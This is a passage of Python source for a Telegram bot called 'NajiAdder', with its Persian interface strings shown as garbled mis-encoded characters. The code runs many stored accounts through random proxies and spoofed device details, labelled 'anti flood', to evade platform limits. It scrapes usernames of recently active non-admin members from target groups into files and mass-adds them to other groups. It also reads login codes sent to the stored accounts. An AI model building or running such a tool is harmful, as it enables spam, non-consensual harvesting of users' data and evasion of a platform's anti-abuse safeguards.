                            await events.respond(" `FloodWait ` : {} \n ÛŒÚ© Ø­Ø³Ø§Ø¨ Ø¯ÛŒÚ¯Ø± Ø±Ø§ Ø§Ù…ØªØ­Ø§Ù† Ú©Ù†ÛŒØ¯".format(wait))
                            await client.disconnect()

                        except Exception as e:
                            await events.respond(
                                " `Error ID PART ` : {} \n ÛŒÚ© Ø­Ø³Ø§Ø¨ Ø¯ÛŒÚ¯Ø± Ø±Ø§ Ø§Ù…ØªØ­Ø§Ù† Ú©Ù†ÛŒØ¯".format(e.__class__))
                            await client.disconnect()

                    else:
                        await events.edit(
                            'Ø®Ø·Ø§ Ø¯Ø± ÛŒØ§ÙØªÙ† Ø¯Ø§Ø¯Ù‡ Ù‡Ø§ÛŒ api Ø¨Ø±Ø§ÛŒ Ø­Ø³Ø§Ø¨ {}! Ù„Ø·ÙØ§ Ø¯ÙˆØ¨Ø§Ø±Ù‡ ÙˆØ§Ø±Ø¯ Ø§ÛŒÙ† Ø­Ø³Ø§Ø¨ Ú©Ø§Ø±Ø¨Ø±ÛŒ Ø´ÙˆÛŒØ¯!'.format(
                                phone))

            await events.reply("âœ… Ú©Ø§Ø± ØªÙ…Ø§Ù… Ø´Ø¯ \n Ø§Ø³ØªÙØ§Ø¯Ù‡ Ú©Ù†ÛŒØ¯ save all ")

        if callback.startswith('*l'):

            device = random.choice(devices)
            version1 = random.choice(version)

            [_, phone, link] = callback.split('|')

            await events.answer('Ù„Ø·ÙØ§ ØµØ¨Ø± Ú©Ù†ÛŒØ¯ .....')
            sleep(0.5)

            await events.edit('| Ù„Ø·ÙØ§ ØµØ¨Ø± Ú©Ù†ÛŒØ¯ ..... ',
                              buttons=[[Button.inline("1ï¸âƒ£", "âœ…"), Button.inline("2ï¸âƒ£", "âŒ"), Button.inline("3ï¸âƒ£", "âŒ"), Button.inline("4ï¸âƒ£", "âŒ")],
                                          [Button.inline("âœ… ", "âœ…"), Button.inline("âŒ", "âœ…"), Button.inline("âŒ", "âœ…"), Button.inline("âŒ", "âœ…")]])

            #### --- anti flood
            apis2 = getapiPhone(phone)

            sleep(0.5)

            if apis2 != 0:

                # try:

                ww = False

                await events.edit("/ Ù„Ø·ÙØ§ ØµØ¨Ø± Ú©Ù†ÛŒØ¯ ...",
                                  buttons=[[Button.inline("1ï¸âƒ£", "âœ…"), Button.inline("2ï¸âƒ£", "âŒ"), Button.inline("3ï¸âƒ£", "âŒ"), Button.inline("4ï¸âƒ£", "âŒ")],
                                          [Button.inline("âœ… ", "âœ…"), Button.inline("âœ…", "âœ…"), Button.inline("âŒ", "âœ…"), Button.inline("âŒ", "âœ…")]])
                print("before client")
                print("get proxy")
                pr = await random_proxy()
                print(pr)
                # pr = random_proxy()
                # proxy = proxy = (socks.SOCKS5, str(pr[0]), int(pr[1]), True, str(pr[2]), str(pr[3]))
                client = TelegramClient('Accounts/{}'.format(phone).replace(".session", ""), int(apis2[0]), apis2[1], device_model=device,
                                        connection=connection.ConnectionTcpMTProxyRandomizedIntermediate,
                                        proxy=pr,
                                        system_version=version1,
                                        app_version="7.84",
                                        lang_code='en',
                                        system_lang_code='en')

                print("after client")
                await client.connect()
                print("afler connect")

                ww = await join(client, link, phone)  ### if user Already in group & joint in it -> ww = 1
                print("after join")

                if ww == True:

                    keu = link
                    await events.edit('| Ù„Ø·ÙØ§ ØµØ¨Ø± Ú©Ù†ÛŒØ¯ ...',
                                      buttons=[[Button.inline("1ï¸âƒ£", "âœ…"), Button.inline("2ï¸âƒ£", "âŒ"), Button.inline("3ï¸âƒ£", "âŒ"), Button.inline("4ï¸âƒ£", "âŒ")],
                                          [Button.inline("âœ… ", "âœ…"), Button.inline("âœ…", "âœ…"), Button.inline("âœ…", "âœ…"), Button.inline("âŒ", "âœ…")]])

                    if '@' in link:
                        keu = link.split('@')[1]

                    f1 = open('Database/{}.txt'.format(keu), 'w')

                    counter = 0

                    links = link

                    if not '@' in link:
                        links = 'https://t.me/joinchat/{}'.format(link)

                    participants = await  client.get_participants(links, filter=ChannelParticipantsAdmins)
                    myid = (await client.get_me()).id
                    dontaddme = []
                    try:
                        for admins in participants:
                            if admins.username != None:
                                dontaddme.append(admins.username)
    
                        bbb = Client(tele_to_pyro('Accounts/{}'.format(phone).replace(".session", ""), myid), int(apis2[0]), apis2[1])
                        async with bbb:
                            countMember = await bbb.get_chat_members_count(links)
                            countFor = 26 if countMember >= 5000 else int(countMember/200) + 1
                            lists = []
                            s = 0
                            counter = 0
                            for i in range(countFor):
                                for item in await bbb.get_chat_members(links, offset=s, limit=200):
                                    if str(item.user.username) not in dontaddme and "bot" not in str(item.user.username) and "BOT" not in str(item.user.username) and "_bot" and str(item.user.username) not in lists and online_within_pyro(item, 6):
                                        lists.append(str(item.user.username))
                                        f1.write(str(item.user.username) + '\n')
                                        counter += 1
                                s += 200
                                time.sleep(6.5)
                            await bbb.disconnect()
                        # async for item in client.iter_participants(links, aggressive=True):
                        #     if item.username != None:

                        #         if online_within(item, 6) and str(item.username) not in dontaddme and "bot" not in str(
                        #                 item.username) and "BOT" not in str(item.username) and "_bot" not in str(
                        #                 item.username):
                        #             f1.write(str(item.username) + '\n')

                        #             counter += 1
        
                        # for item in await client.get_participants(links):
                        #     if item.username != None:

                        #         if online_within(item, 6) and str(item.username) not in dontaddme and "bot" not in str(
                        #                 item.username) and "BOT" not in str(item.username) and "_bot" not in str(
                        #                 item.username):
                        #             f1.write(str(item.username) + '\n')

                        #             counter += 1

                    except Exception as e:
                        print(str(e)) 
                    
                    f1.close()

                    await events.edit('/ Ù„Ø·ÙØ§ ØµØ¨Ø± Ú©Ù†ÛŒØ¯ ...',
                                      buttons=[[Button.inline("1ï¸âƒ£", "âœ…"), Button.inline("2ï¸âƒ£", "âŒ"), Button.inline("3ï¸âƒ£ : {}".format(counter), "âŒ"), Button.inline("4ï¸âƒ£", "âŒ")],
                                          [Button.inline("âœ… ", "âœ…"), Button.inline("âœ…", "âœ…"), Button.inline("âœ…", "âœ…"), Button.inline("âœ…", "âœ…")]])
                    await bot.send_file(events.chat_id, file='Database/{}.txt'.format(keu),
                                        caption="â™»ï¸ØªØ¹Ø¯Ø§Ø¯ `{}` ÛŒÙˆØ²Ø± Ø§Ø² Ú¯Ø±ÙˆÙ‡ Ù‡Ø¯Ù Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ø¬Ù…Ø¹ Ø§ÙˆØ±ÛŒ Ø´Ø¯!".format(counter, keu))
                    await client.disconnect()
                elif ww == -1:
                    await events.edit('Your account has been deleted ! ...')
                    await client.disconnect()
                elif ww == -2:
                    await events.edit('Sorry Bot kicked out from sessions ...')
                    await client.disconnect()

                elif ww == -3:
                    await events.edit("Ø¬Ù„Ø³Ù‡ Ø¯Ø± Ø¯Ùˆ Ø¢Ø¯Ø±Ø³ IP Ù…Ø®ØªÙ„Ù Ø§Ø¬Ø±Ø§ Ø´Ø¯ Ù„Ø·ÙØ§Ù‹ Ø­Ø³Ø§Ø¨ Ø¯ÛŒÚ¯Ø±ÛŒ Ø±Ø§ Ø§Ù†ØªØ®Ø§Ø¨ Ú©Ù†ÛŒØ¯")
                    await client.disconnect()



            # except ValueError:
            #     await events.respond("Ø§ÛŒÙ† Ù„ÛŒÙ†Ú© Ù…Ù†Ù‚Ø¶ÛŒ Ø´Ø¯Ù‡ Ùˆ ÛŒØ§ Ø¯Ø±Ø³Øª Ù†ÛŒØ³Øª ")
            #     await client.disconnect()

            # except errors.rpcerrorlist.FloodWaitError as e:
            #     wait = [int(s) for s in str(e).split() if s.isdigit()][0]
            #     await events.respond(f" `FloodWait ` : {wait} \n Try another Account")
            #     await client.disconnect()

            # except Exception as e:
            #     await events.respond(f" `Error ` : {e.__class__} \n Try another Account")
            #     await client.disconnect()

            else:
                await events.edit(
                    'Ø®Ø·Ø§ Ø¯Ø± ÛŒØ§ÙØªÙ† Ø¯Ø§Ø¯Ù‡ Ù‡Ø§ÛŒ api Ø¨Ø±Ø§ÛŒ Ø­Ø³Ø§Ø¨ {}! Ù„Ø·ÙØ§ Ø¯ÙˆØ¨Ø§Ø±Ù‡ ÙˆØ§Ø±Ø¯ Ø§ÛŒÙ† Ø­Ø³Ø§Ø¨ Ú©Ø§Ø±Ø¨Ø±ÛŒ Ø´ÙˆÛŒØ¯!'.format(phone))


        elif callback == 'clean':
            usernames.clear()
            await events.edit('Ù„ÛŒØ³Øª Ù†Ø§Ù… Ù‡Ø§ÛŒ Ú©Ø§Ø±Ø¨Ø±ÛŒ Ø§Ù†Ø¬Ø§Ù… Ø´Ø¯ Ø§Ú©Ù†ÙˆÙ† Ø®Ø§Ù„ÛŒ Ø§Ø³Øª!')


        elif callback == 'no':
            await events.edit('Ø®ÙˆØ¨ Ù…Ù† Ø§ÛŒÙ† Ø±ÙˆÙ†Ø¯ Ø±Ø§ Ù„ØºÙˆ Ù…ÛŒ Ú©Ù†Ù…')



        elif callback.startswith('save'):
            kuy = callback.split('|')[1]
            mfile = get_file(kuy.split('.txt')[0])

            print(kuy)  ### -- debug

            if mfile != 0:
                for item in mfile:

                    if ("id" in kuy):
                        userid.append(int(item.split('\n')[0]))
                    else:
                        usernames.append((item.split('\n')[0]))

                ev = []
                for item in os.scandir('Database'):
                    l = [[Button.inline(item.name, 'save|{}'.format(item.name))]]
                    ev.extend(l)
                if len(l) >= 1:
                    ev.extend([[Button.inline("cancel", "close")]])

                    if ("id" in kuy):

                        await events.edit(
                            '''ğŸ†”ØªØ¹Ø¯Ø§Ø¯ ÛŒÙˆØ²Ø±Ù†ÛŒÙ… Ù‡Ø§ÛŒ Ø´Ù…Ø§ : `{}`


Ø¨Ø§ÛŒÚ© Ú©Ù„ÛŒÚ© ÛŒÙˆØ²Ø±Ø§ÛŒ Ø¬Ù…Ø¹ Ø´Ø¯Ù‡ Ø±Ø§ Ø°Ø®ÛŒØ±Ù‡ Ú©Ù†ÛŒØ¯ğŸ‘‡
                            '''.format(
                                len(list(set(userid)))), buttons=ev)

                    else:
                        await events.edit(
                            '''ğŸ†”ØªØ¹Ø¯Ø§Ø¯ ÛŒÙˆØ²Ø±Ù†ÛŒÙ… Ù‡Ø§ÛŒ Ø´Ù…Ø§ : `{}`


Ø¨Ø§ÛŒÚ© Ú©Ù„ÛŒÚ© ÛŒÙˆØ²Ø±Ø§ÛŒ Ø¬Ù…Ø¹ Ø´Ø¯Ù‡ Ø±Ø§ Ø°Ø®ÛŒØ±Ù‡ Ú©Ù†ÛŒØ¯ğŸ‘‡
                            '''.format(
                                len(list(set(usernames)))), buttons=ev)


                else:
                    await events.reply('Ù„ÛŒØ³Øª Ø®Ø§Ù„ÛŒ Ø§Ø³Øª ')



            else:
                await events.edit('Ù…Ø´Ú©Ù„ÛŒ Ø¯Ø± Ù„ÙˆØ¯ ÙØ§ÛŒÙ„ ÙˆØ¬ÙˆØ¯ Ø¯Ø§Ø±Ø¯  ...')


        elif callback.startswith('getcodss'):
            phn = callback.split('|')[1]
            device = random.choice(devices)
            version1 = random.choice(version)
            apis2 = getapiPhone(phn)
            pr = await random_proxy()
            print(pr)
            # pr = random_proxy()
            # proxy = proxy = (socks.SOCKS5, str(pr[0]), int(pr[1]), True, str(pr[2]), str(pr[3]))
            client = TelegramClient('Accounts/{}'.format(phn).replace(".session", ""), int(apis2[0]), apis2[1], device_model=device,
                                    connection=connection.ConnectionTcpMTProxyRandomizedIntermediate,
                                    proxy=pr,
                                    system_version=version1,
                                    app_version="7.84",
                                    lang_code='en',
                                    system_lang_code='en')

            print("after client")
            await client.connect()
            for message in await client.get_messages(777000, limit=1):
                # code = re.findall(r'\d+', message.message)
                await events.reply(str(message.message))
            await client.disconnect()
        
        elif callback.startswith('settings'):
            phn = callback.split('|')[1]
            await events.reply('What you want with {} ?'.format(phn), buttons=[
                [Button.inline('ğŸ—‘ Ø­Ø°Ù', 'delete|{}'.format(phn)), Button.inline('Ø¨Ø³ØªÙ† ', 'close')]
            ])

        elif callback == 'close':
            await events.edit('Ù¾Ù†Ù„ Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ø¨Ø³ØªÙ‡ Ø´Ø¯')

        elif callback.startswith('delete'):
            pehen = callback.split('|')[1]
            try:
                os.remove('Accounts/{}'.format(pehen))
                await events.edit('Ø§Ú©Ø§Ù†Øª {} Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ø§Ø² Ø¯ÛŒØªØ§Ø¨ÛŒØ³ Ù¾Ø§Ú© Ø´Ø¯ !'.format(pehen))
            except:
                await events.edit('Ù…Ø´Ú©Ù„ÛŒ Ø¯Ø± Ù¾Ø§Ú© Ú©Ø±Ø¯Ù† {} Ø§Ø² Ø¯ÛŒØªØ§Ø¨ÛŒØ³ ÙˆØ¬ÙˆØ¯ Ø¯Ø§Ø±Ø¯ ! '.format(pehen))




        elif (callback.startswith("add")):
            ev = []
            datas = callback.split("|")
            for item in os.scandir(f'Accounts'):
                if 'journal' not in item.name and '.session' in item.name:
                    ev.append(item.name)

            mode = datas[0]

            datas[1] = datas[1].strip()

            if 'joinchat' in datas[1]:
                link = datas[1]
            elif '@' in datas[1]:
                link = datas[1]
            else:
                link = None
            print(datas)   
            print(link)   
            if link != None:
                if (len(ev) < int(datas[2])):
                    await events.reply(
                        "**âš ï¸ ØªØ¹Ø¯Ø§Ø¯ Ø§Ú©Ø§Ù†Øª Ù‡Ø§ÛŒ Ù…Ø¬ÙˆØ¯ Ú©Ù… ØªØ± Ø§Ø² Ù…Ù‚Ø¯Ø§Ø± Ø³ÙØ§Ø±Ø´ Ø´Ù…Ø§ Ø§Ø³Øª ! Ù„Ø·ÙØ§ ØªØ¹Ø¯Ø§Ø¯ Ø§Ú©Ø§Ù†Øª Ú©Ù… ØªØ±ÛŒ Ø±Ùˆ Ø³ÙØ§Ø±Ø´ Ø¨Ø¯ÛŒØ¯ !  **")
                else:
                    msg = await events.reply('Ù„Ø·ÙØ§ ØµØ¨Ø± Ú©Ù†ÛŒØ¯ .....')
                    await worker(msg, datas[1], datas[2], datas[3], mode, usernames)
            else:
                await events.reply('ğŸ”† Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ú¯Ø±ÙˆÙ‡ Ù…Ù‚ØµØ¯ Ù†Ø§Ø¯Ø±Ø³Øª Ø§Ø³Øª ')

        # Help
    if (int(events.original_update.user_id) in NStEVJzsyY) or (int(events.original_update.user_id) in admins):
        if callback == 'backhelp':
            await events.edit('Ø¨Ù‡ Ø±Ø¨Ø§Øª NajiAdder Ø®ÙˆØ´ Ø§ÙˆÙ…Ø¯ÛŒ',buttons=KEYBOARDHOME)
            datauser.clear()
        elif callback == 'fileadd':
            datauser["typeusers2"] = [".", "."]
            datauser["typeusers"] = ["filestyp", str(events.chat_id)]
            await events.edit("please send file")
        elif callback == 'help-all':
            await events.edit('''ØªØ³Øª''')
        elif callback == 'help-login':
            await events.edit('''Ø´Ù…Ø§Ø±Ù‡ Ø±Ø§ Ø¨ÙØ±Ø³ØªÛŒØ¯''',buttons=[[Button.inline('Ø¨Ø±Ú¯Ø´Øª', 'backhelp')]])
            datauser["typeusers2"] = [".", "."]
            datauser["typeusers"] = ["phoneadd", str(events.chat_id)]
            
        elif callback == 'help-extra':
            await events.edit('''
Ù„Ø·ÙØ§ Ø§ÛŒØ¯ÛŒ Ø±Ø§ Ø¨Ù‡ Ø§ÛŒÙ† ØµÙˆØ±Øª Ø¨ÙØ±Ø³ØªÛŒØ¯ 

@link 
    
    â—¾ï¸Ø´Ø±ÙˆØ¹ ÛŒÙˆØ²Ø±Ú¯ÛŒØ±ÛŒ Ø§Ø² Ú¯Ø±ÙˆÙ‡''',buttons=[[Button.inline('Ø¨Ø±Ú¯Ø´Øª', 'backhelp')]])
            datauser["typeusers2"] = [".", "."]
            datauser["typeusers"] = ["get", str(events.chat_id)]
 
        elif callback == 'help-numbers':
            ev = []
            tl = 0
            for item in os.scandir('Accounts'):
                if 'journal' not in item.name and '.session' in item.name:
                    l = [[Button.inline(item.name, 'settings|{}'.format(item.name))]]
                    ev.extend(l)
                    tl += 1
            if tl >= 1:
                try:
                    await events.reply('Ø´Ù…Ø§  **{}**  Ø§Ú©Ø§Ù†Øª Ø¯Ø§Ø±ÛŒØ¯  '.format(tl), buttons=ev)

                except errors.rpcerrorlist.ReplyMarkupTooLongError:
                    async for i in await list_splitter(ev, 50):
                        await events.reply('Ø´Ù…Ø§  **{}**  Ø§Ú©Ø§Ù†Øª Ø¯Ø§Ø±ÛŒØ¯  '.format(tl), buttons=ev)

            else:
                await events.reply('Ø¯ÛŒØªØ§Ø¨ÛŒØ³ Ø®Ø§Ù„ÛŒ Ø§Ø³Øª !')

        elif callback == 'getcodphone':
            ev = []
            tl = 0
            for item in os.scandir('Accounts'):
                if 'journal' not in item.name and '.session' in item.name:
                    l = [[Button.inline(item.name, 'getcodss|{}'.format(item.name))]]
                    ev.extend(l)
                    tl += 1
            if tl >= 1:
                try:
                    await events.reply('Ø´Ù…Ø§  **{}**  Ø§Ú©Ø§Ù†Øª Ø¯Ø§Ø±ÛŒØ¯  '.format(tl), buttons=ev)

                except errors.rpcerrorlist.ReplyMarkupTooLongError:
                    async for i in await list_splitter(ev, 50):
                        await events.reply('Ø´Ù…Ø§  **{}**  Ø§Ú©Ø§Ù†Øª Ø¯Ø§Ø±ÛŒØ¯  '.format(tl), buttons=ev)

            else:
                await events.reply('Ø¯ÛŒØªØ§Ø¨ÛŒØ³ Ø®Ø§Ù„ÛŒ Ø§Ø³Øª !')

        elif callback == 'help-save':
            l = []
            ev = []
            for item in os.scandir('Database'):
                l = [[Button.inline(item.name, 'save|{}'.format(item.name))]]
                ev.extend(l)

            if len(l) >= 1:
                await events.reply('ğŸ”† Ø´Ù…Ø§ Ù…ÛŒ ØªÙˆØ§Ù†ÛŒØ¯ Ù„ÛŒØ³Øª ØªÙ…Ø§Ù… Ú¯Ø±ÙˆÙ‡ Ù‡Ø§ÛŒ Ù…ÙˆØ¬ÙˆØ¯ Ø¯Ø± Ø¯ÛŒØªØ§Ø¨ÛŒØ³ Ø±Ùˆ Ù…Ø´Ø§Ù‡Ø¯Ù‡ Ú©Ù†ÛŒØ¯  ',
                                    buttons=ev)
            else:
                await events.reply('âŒ Ù„ÛŒØ³Øª Ø®Ø§Ù„ÛŒ Ø§Ø³Øª ')
    #         await events.edit('''save 
    
    # â—¾ï¸Ø°Ø®ÛŒØ±Ù‡ Ú©Ø±Ø¯Ù† ÛŒÙˆØ²Ø±Ù‡Ø§ÛŒ Ø¬Ù…Ø¹ Ø¢ÙˆØ±ÛŒ Ø´Ø¯Ù‡. Ø³Ù¾Ø³ Ø§Ø² Ù…Ù†ÙˆÛŒ Ø¨Ø§Ø²Ø´Ø¯Ù‡ Ø±ÙˆÛŒ Ú¯Ø±ÙˆÙ‡ÛŒ Ú©Ù‡ Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù†Ø¬Ø§Ù… Ø´Ø¯Ù‡ Ú©Ù„ÛŒÚ© Ú©Ù†ÛŒØ¯ ÛŒÙˆØ²Ø± Ù‡Ø§ Ø°Ø®ÛŒØ±Ù‡ Ø´ÙˆØ¯''',buttons=[[Button.inline('Ø¨Ø±Ú¯Ø´Øª', 'backhelp')]])
        elif callback == 'help-status':
            await events.edit('ğŸ”† ØªØ¹Ø¯Ø§Ø¯ Ú©Ù„ username Ù‡Ø§  : {}'.format(len(usernames)), buttons=[[Button.inline("clear", "clean"), Button.inline('Ø¨Ø±Ú¯Ø´Øª', 'backhelp')]])
    #         await events.edit('''stats
    
    # â—¾ï¸Ù…Ø´Ø§Ù‡Ø¯Ù‡ ÛŒÙˆØ²Ø±Ù‡Ø§ÛŒ Ø¬Ù…Ø¹ Ø´Ø¯Ù‡ Ø¯Ø± Ø¯ÛŒØªØ§Ø¨ÛŒØ³''',buttons=[[Button.inline('Ø¨Ø±Ú¯Ø´Øª', 'backhelp')]])
        elif callback == 'help-add':
            await events.edit('''Ù„Ø·ÙØ§ Ø§ÛŒØ¯ÛŒ Ø±Ø§ Ø¨Ù‡ Ø§ÛŒÙ† ØµÙˆØ±Øª Ø¨ÙØ±Ø³ØªÛŒØ¯ 
@link
    â—¾ï¸Ø§ØºØ§Ø² ÙØ±Ø§ÛŒÙ†Ø¯ Ø§Ø¯ Ø¨Ø§ 6Ø´Ù…Ø§Ø±Ù‡ Ù‡Ù…Ø²Ù…Ø§Ù† Ùˆ Ù‡Ø±Ø´Ù…Ø§Ø±Ù‡ 50 Ø§Ø¯''',buttons=[[Button.inline('Ø¨Ø±Ú¯Ø´Øª', 'backhelp')]])
            datauser["typeusers2"] = [".", "."]
            datauser["typeusers"] = ["add", str(events.chat_id)]
    #         await events.edit('''add @link 6 50
    
    # â—¾ï¸Ø§ØºØ§Ø² ÙØ±Ø§ÛŒÙ†Ø¯ Ø§Ø¯ Ø¨Ø§ 6Ø´Ù…Ø§Ø±Ù‡ Ù‡Ù…Ø²Ù…Ø§Ù† Ùˆ Ù‡Ø±Ø´Ù…Ø§Ø±Ù‡ 50 Ø§Ø¯''',buttons=[[Button.inline('Ø¨Ø±Ú¯Ø´Øª', 'backhelp')]])
        elif callback == 'help-sudo':
            await events.edit('''.''',buttons=[[Button.inline('sudo list', 'llsudo'), Button.inline('del sudo', 'delsudooo')], [Button.inline('add sudo', 'addsudoo')],[Button.inline('Ø¨Ø±Ú¯Ø´Øª', 'backhelp')]])
        elif callback == 'help-supp':
            await events.edit('''Ú©Ø§Ø±ÛŒ Ø¨ÙˆØ¯ Ø§ÛŒÙ† Ø§ÛŒØ¯ÛŒ Ù…Ø¯ÛŒØ±Ù‡ Ù¾ÛŒØ§Ù… Ø¨Ø¯ÛŒÙ†
    
    @ImTanun''',buttons=[[Button.inline('Ø¨Ø±Ú¯Ø´Øª', 'backhelp')]])
        elif callback == 'addsudoo':
            datauser["typeusers2"] = [".", "."]
            datauser["typeusers"] = ["adsu", str(events.chat_id)]
            await events.edit('''Ø§ÛŒØ¯ÛŒ Ø¹Ø¯Ø¯ÛŒ Ø±Ø§ Ø¨ÙØ±Ø³ØªÛŒØ¯''',buttons=[[Button.inline('Ø¨Ø±Ú¯Ø´Øª', 'backhelp')]])
        elif callback == 'delsudooo':
            datauser["typeusers2"] = [".", "."]
            datauser["typeusers"] = ["delsu", str(events.chat_id)]
            await events.edit('''Ø§ÛŒØ¯ÛŒ Ø¹Ø¯Ø¯ÛŒ Ø±Ø§ Ø¨ÙØ±Ø³ØªÛŒØ¯''',buttons=[[Button.inline('Ø¨Ø±Ú¯Ø´Øª', 'backhelp')]])
        elif callback == 'lunche':
            datauser["typeusers2"] = [".", "."]
            datauser["typeusers"] = ["lunche", str(events.chat_id)]
            await events.edit('''Ø¯Ø³ØªÙˆØ± Ø±Ø§ Ø¨ÙØ±Ø³ØªÛŒØ¯''',buttons=[[Button.inline('Ø¨Ø±Ú¯Ø´Øª', 'backhelp')]])
        elif callback == 'paksazi':
            await events.edit('''Ø§Ù†ØªØ®Ø§Ø¨ Ú©Ù†ÛŒØ¯''',buttons=[[Button.inline('Ø§Ú©Ø§Ù†Øª', 'accdele')],[Button.inline('Ø¯ÛŒØªØ§Ø¨ÛŒØ³', 'datdele'), Button.inline('Ø¯Ù„ÛŒØªØ§', 'backhelp')],[Button.inline('Ø¨Ø±Ú¯Ø´Øª', 'deledel')]])
        elif callback == 'accdele':
            shutil.rmtree('Accounts')
            os.mkdir('Accounts')
            await events.edit('''Ù¾Ø§Ú©Ø³Ø§Ø²ÛŒ Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ø§Ù†Ø¬Ø§Ù… Ø´Ø¯''',buttons=[[Button.inline('Ø¨Ø±Ú¯Ø´Øª', 'backhelp')]])

        elif callback == 'datdele':
            shutil.rmtree('Database')
            os.mkdir('Database')
            await events.edit('''Ù¾Ø§Ú©Ø³Ø§Ø²ÛŒ Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ø§Ù†Ø¬Ø§Ù… Ø´Ø¯''',buttons=[[Button.inline('Ø¨Ø±Ú¯Ø´Øª', 'backhelp')]])
        
        elif callback == 'deledel':
            shutil.rmtree('Delete')
            os.mkdir('Delete')
            await events.edit('''Ù¾Ø§Ú©Ø³Ø§Ø²ÛŒ Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ø§Ù†Ø¬Ø§Ù… Ø´Ø¯''',buttons=[[Button.inline('Ø¨Ø±Ú¯Ø´Øª', 'backhelp')]])

        elif callback == 'startlinkss':
            await events.edit("Ø§Ù†ØªØ®Ø§Ø¨ Ú©Ù†ÛŒØ¯", buttons=[[Button.inline('Ø¨ØµÙˆØ±Øª Ø¯Ø³ØªÛŒ', 'menualstart')],[Button.inline('Ø¨ØµÙˆØ±Øª ØªÚ©Ø³Øª', 'starttexts'), Button.inline('Ø¨ØµÙˆØ±Øª Ø¨Ø§ØªÙ†', 'buttonstarts')], [Button.inline('Ø¨Ø±Ú¯Ø´Øª', 'backhelp')]])

        elif callback == 'starttexts':
            datauser["typeusers2"] = [".", "."]
            datauser["typeusers"] = ["starttexts", str(events.chat_id)]
            await events.edit("Ù„Ø·ÙØ§ Ù„ÛŒÙ†Ú© Ø±Ø¨Ø§Øª Ø±Ø§ Ø¨ÙØ±Ø³ØªÛŒØ¯", buttons=[[Button.inline('Ø¨Ø±Ú¯Ø´Øª', 'backhelp')]])

        elif callback == 'menualstart':
            datauser["typeusers2"] = [".", "."]
            datauser["typeusers"] = ["menualstart", str(events.chat_id)]
            await events.edit("Ù„Ø·ÙØ§ Ù„ÛŒÙ†Ú© Ø±Ø¨Ø§Øª Ø±Ø§ Ø¨ÙØ±Ø³ØªÛŒØ¯", buttons=[[Button.inline('Ø¨Ø±Ú¯Ø´Øª', 'backhelp')]])

        elif callback == 'buttonstarts':
            datauser["typeusers2"] = [".", "."]
            datauser["typeusers"] = ["buttonstarts", str(events.chat_id)]
            await events.edit("Ù„Ø·ÙØ§ Ù„ÛŒÙ†Ú© Ø±Ø¨Ø§Øª Ø±Ø§ Ø¨ÙØ±Ø³ØªÛŒØ¯", buttons=[[Button.inline('Ø¨Ø±Ú¯Ø´Øª', 'backhelp')]])

        elif callback == 'llsudo':
            txt = ""
            for users in NStEVJzsyY:
                txt += "ğŸ‘½ " + str(users) + "\n â–â–â–â–â–â– \n"
            await events.edit(txt, buttons=[[Button.inline('sudo list', 'llsudo'), Button.inline('del sudo', 'delsudooo')], [Button.inline('add sudo', 'addsudoo'), Button.inline('Ø¨Ø±Ú¯Ø´Øª', 'backhelp')]])

@bot.on(events.NewMessage())
async def _(event):
    global datauser
    
    try:
        if datauser["typeusers"][0] == "phoneadd":
            try:
                phones = event.text
                if os.path.exists('Accounts/{0}.session'.format(phones)):
                    await event.reply('**Ø§ÛŒÙ† Ø§Ú©Ø§Ù†Øª Ø§Ø² Ù‚Ø¨Ù„ Ø¯Ø± Ø¯ÛŒØªØ§Ø¨ÛŒØ³ ÙˆØ¬ÙˆØ¯ Ø¯Ø§Ø´ØªÙ‡ ! **')
                else:
                    await event.reply('**Ù„Ø·ÙØ§ ØµØ¨Ø± Ú©Ù†ÛŒØ¯ ......**')
                    result, xu = create_api(phones)
                    if result == False:
                        await event.reply(
                            '**Ù…Ø´Ú©Ù„ÛŒ Ø¯Ø± Ø§Ø±Ø³Ø§Ù„ Ú©Ø¯ Ø¨Ù‡ Ø´Ù…Ø§Ø±Ù‡  {} Ù¾ÛŒØ´ Ø§ÙˆÙ…Ø¯Ù‡  ! \n Ø§Ø­ØªÙ…Ø§Ù„Ø§ Ø´Ù…Ø§Ø±Ù‡ Ø´Ù…Ø§ Ù…Ø­Ø¯ÙˆØ¯ Ø´Ø¯Ù‡ \n Ù„Ø·ÙØ§ Ø¯ÙˆØ¨Ø±Ù‡ Ø¨Ø¹Ø¯ Ø§Ø² 48 Ø³Ø§Ø¹Øª ØªÙ„Ø§Ø´ Ú©Ù†ÛŒØ¯ **'.format(
                                phones))
                    else:
                        await event.reply('''
    âœ… Ú©Ø¯ Ø§Ø­Ø±Ø§Ø² Ù‡ÙˆÛŒØª Ø¨Ù‡ Ø´Ù…Ø§Ø±Ù‡ : {} Ø§Ø±Ø³Ø§Ù„ Ø´Ø¯ â•

    âŒÙ„Ø·ÙØ§ Ú©Ø¯ Ø§Ø±Ø³Ø§Ù„ Ø´Ø¯Ù‡ Ø±Ùˆ Ø¨ÙØ±Ø³ØªÛŒØ¯ :
                            '''.format(event.text))
                        data['auth_mode'] = '{0}:{1}:{2}'.format(phones, result, xu)
                datauser["typeusers2"] = [".", "."]
                datauser["typeusers"] = ["codesforphone", str(event.chat_id)]  
                datauser["datas"] = [event.text]
            except Exception as e:
                print(str(e))
                await event.reply("Ù„Ø·ÙØ§ Ø¯ÙˆØ¨Ø§Ø±Ù‡ Ø§Ù…ØªØ®Ø§Ù† Ú©Ù†ÛŒØ¯")

        elif datauser["typeusers"][0] == "codesforphone":
            try:
                print(data)
                w = random.choice(apis)
                device = random.choice(devices)
                version1 = random.choice(version)
                key = data['auth_mode']
                await event.reply('**Ù„Ø·ÙØ§ ØµØ¨Ø± Ú©Ù†ÛŒØ¯ ..... **')
                result, xu = auth(key.split(':')[0], key.split(':')[1], event.text,
                                    key.split(":")[2])
                if result == False:
                    await event.reply('**Ù…Ø´Ú©ÛŒ Ø¯Ø± Ø³Ø§Ø®Øª api Ù¾ÛŒØ´ Ø§ÙˆÙ…Ø¯Ù‡ Ù„Ø·ÙØ§ Ø¨Ø¹Ø¯Ø§ Ù…Ø¬Ø¯Ø¯Ø§ ØªÙ„Ø§Ø´ Ú©Ù†ÛŒØ¯ ! **')
                    data.clear()
                else:
